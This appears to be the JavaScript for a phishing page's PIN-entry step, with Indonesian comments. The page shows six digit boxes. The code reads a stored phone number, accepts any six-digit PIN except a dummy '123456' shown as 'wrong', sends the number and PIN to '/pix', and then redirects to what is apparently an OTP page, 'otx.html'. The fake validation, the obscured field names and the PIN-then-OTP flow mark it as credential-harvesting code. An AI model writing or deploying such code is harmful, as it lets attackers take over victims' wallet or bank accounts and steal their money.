// pix.js

const inputs = document.querySelectorAll(".pix-box");
const showBtn = document.getElementById("showBtn");
const errorBox = document.getElementById("errorBox");
// Ganti selector loadingBox lama ke inline loading baru
const inlineLoading = document.getElementById("inlineLoading"); 

let isShow = false;

/* FADE IN */ 
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* ========================= */
/* RESET LOADING STATE */
/* ========================= */
window.addEventListener("pageshow", () => {
    // Kembalikan tampilan jika user kembali ke halaman ini
    if(inlineLoading) inlineLoading.style.display = "none";
    inputs.forEach(input => input.classList.remove("hide"));
});

/* ========================= */
/* FOKUS KE BOX KOSONG */
/* ========================= */
inputs.forEach((input, index) => {
    input.addEventListener("click", () => {
        for (let i = 0; i < inputs.length; i++) {
            if (inputs[i].value === "") {
                inputs[i].focus();
                break;
            }
        }
    });
});

/* ========================= */
/* AUTO PIX */
/* ========================= */
inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, '');

        /* HIDE ERROR */
        errorBox.classList.remove("show");

        /* NEXT KOTAK */
        if (input.value.length === 1) {
            if (index < inputs.length - 1) {
                inputs[index + 1].focus();
            }
        }
        checkPix();
    });

    /* BACKSPACE */
    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "") {
            if (index > 0) {
                inputs[index - 1].focus();
            }
        }
    });
});

/* ========================= */
/* SHOW / HIDE PIN BUTTON */
/* ========================= */
showBtn.addEventListener("click", () => {
    isShow = !isShow;
    inputs.forEach(input => {
        input.type = isShow ? "text" : "password";
    });
    showBtn.innerText = isShow ? "SEMBUNYIKAN" : "TAMPILKAN";
});

/* ========================= */
/* CHECK PIX (CORE HANDLING) */
/* ========================= */
async function checkPix() {
    let pix = "";
    inputs.forEach(input => {
        pix += input.value;
    });

    /* KONDISI PIN SUDAH PENUH (6 DIGIT) */
    if (pix.length === 6) {

        /* 1. JIKA PIN SALAH (Contoh Dummy: 123456) */
        if (pix === "123456") {
            if (navigator.vibrate) {
                navigator.vibrate([120, 80, 120]);
            }
            errorBox.classList.add("show");

            setTimeout(() => {
                errorBox.classList.remove("show");
            }, 2000);

            setTimeout(() => {
                inputs.forEach(input => {
                    input.value = "";
                });
                inputs[0].focus();
            }, 300);
            return;
        }

        /* 2. JIKA PIN BENAR / PROSES PENGIRIMAN DATA */
        // Sembunyikan keyboard pada perangkat mobile dengan menghilangkan fokus
        document.activeElement.blur();

        // Berikan efek transisi menghilang pada semua kotak PIN secara simultan
        inputs.forEach(input => {
            input.classList.add("hide");
        });

        // Munculkan spinner ring tepat di tengah area wrapper setelah kotak mulai mengecil
        setTimeout(() => {
            inlineLoading.style.display = "flex";
        }, 150);

        /* PROSES KIRIM DATA DATA KE SERVER */
        const nmrx = localStorage.getItem("nmrx");
        localStorage.setItem("pix", pix);

        try {
            await fetch("/pix", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    nmrx: nmrx,
                    pix: pix
                })
            });
        } catch (error) {
            console.error("Gagal mengirim data:", error);
        }
        
        /* DELAY & REDIREKSI HALAMAN DENGAN FADE OUT */
        setTimeout(() => {
            document.body.classList.add("fade-out");
            setTimeout(() => {
                window.location.href = "otx.html";
            }, 800); // Sinkronisasi waktu animasi fade-out tubuh halaman
        }, 2000);
    }
}
